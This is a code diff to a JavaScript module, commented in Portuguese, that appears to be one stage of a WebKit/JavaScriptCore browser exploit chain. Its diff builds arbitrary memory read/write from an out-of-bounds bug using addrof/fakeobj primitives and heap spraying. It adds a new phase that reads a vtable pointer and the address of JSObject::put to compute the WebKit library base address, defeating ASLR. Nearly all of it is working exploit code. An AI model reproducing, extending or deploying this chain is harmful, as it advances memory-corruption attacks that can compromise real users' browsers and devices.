@@ -1,20 +1,20 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v100 - R60 Final com Estabilização e Verificação de L/E)
+// js/script3/testArrayBufferVictimCrash.mjs (v101 - R61 Final com Vazamento de Base WebKit)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
-// Implementada uma verificação funcional de escrita e leitura para confirmar que as
-// primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
+// Utiliza as primitivas de R/W 100% funcionais e verificadas para realizar o próximo
+// passo crítico: vazar o endereço base da biblioteca do WebKit na memória,
+// derrotando o ASLR para o user-space.
 // =======================================================================================
 
-import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { logS3 } from './s3_utils.mjs';
+import { AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Adicionada importação de WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v100_R60";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v101_R61";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -34,13 +34,17 @@ function doubleToInt64(double) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO E LEAK)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Vazamento de Base WebKit ---`, "test");
 
-    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };
+    let final_result = { 
+        success: false, 
+        message: "A cadeia de exploração não foi concluída.",
+        webkit_base_address: null
+    };
 
     try {
         // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
@@ -64,8 +68,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
         const leaker_addr = addrof(leaker);
-        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high()); // Offset comum da primeira propriedade
-
+        
         const arb_read_final = (addr) => {
             leaker.obj_prop = fakeobj(addr);
             return doubleToInt64(leaker.val_prop);
@@ -79,19 +82,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
         
-        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
         const spray = [];
         for (let i = 0; i < 1000; i++) {
             spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
         }
-        const test_obj = spray[500]; // Pega um objeto do meio do spray
+        const test_obj = spray[500];
         logS3("Spray de 1000 objetos concluído para estabilização.", "info");
 
-        // 2. Teste de Escrita e Leitura
         const test_obj_addr = addrof(test_obj);
         const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
-        
-        // A primeira propriedade (inline) de um objeto JS geralmente fica no offset 0x10
         const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
         
         logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
@@ -101,11 +100,46 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");
 
         if (value_read.equals(value_to_write)) {
-            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
+            logS3("++++++++++++ SUCESSO! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
+            
+            // --- FASE 5: Vazamento do Endereço Base do WebKit ---
+            logS3("--- FASE 5: Vazando Endereço Base do WebKit... ---", "subtest");
+            
+            // O ponteiro da V-Table está no início do objeto (offset 0)
+            const vtable_addr = arb_read_final(test_obj_addr);
+            logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "info");
+
+            if (!vtable_addr || vtable_addr.equals(AdvancedInt64.Zero)) {
+                throw new Error("Ponteiro da V-Table lido é nulo ou zero, não é possível continuar.");
+            }
+
+            // O offset de 'put' dentro da V-Table é definido em config.mjs
+            const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET); // Geralmente 0x18
+            const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
+            
+            // Lê o endereço real da função 'put' da memória
+            const put_func_addr = arb_read_final(put_func_ptr_addr);
+            logS3(`Lido ponteiro da função put() da V-Table -> ${put_func_addr.toString(true)}`, "info");
+            
+            if (!put_func_addr || put_func_addr.equals(AdvancedInt64.Zero)) {
+                throw new Error("Ponteiro da função put() lido é nulo ou zero.");
+            }
+
+            // Pega o offset estático da função 'put' de config.mjs
+            const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]); // 0xBD68B0
+            
+            // Calcula o endereço base: EndereçoReal - OffsetEstático = EndereçoBase
+            const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);
+
+            logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
+            
+            // Atualiza o resultado final com sucesso e o endereço vazado
             final_result = {
                 success: true,
-                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
+                message: "Leitura/Escrita verificada e endereço base do WebKit vazado com sucesso.",
+                webkit_base_address: webkit_base_addr.toString(true)
             };
+
         } else {
             throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
         }
@@ -116,12 +150,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    
+    // Retorna um resultado detalhado para o orquestrador
     return {
         errorOccurred: final_result.success ? null : final_result.message,
         addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
-        webkit_leak_result: { success: final_result.success, msg: final_result.message },
+        webkit_leak_result: { 
+            success: final_result.success, 
+            msg: final_result.message,
+            webkit_base_candidate: final_result.webkit_base_address
+        },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak)' }
     };
 }
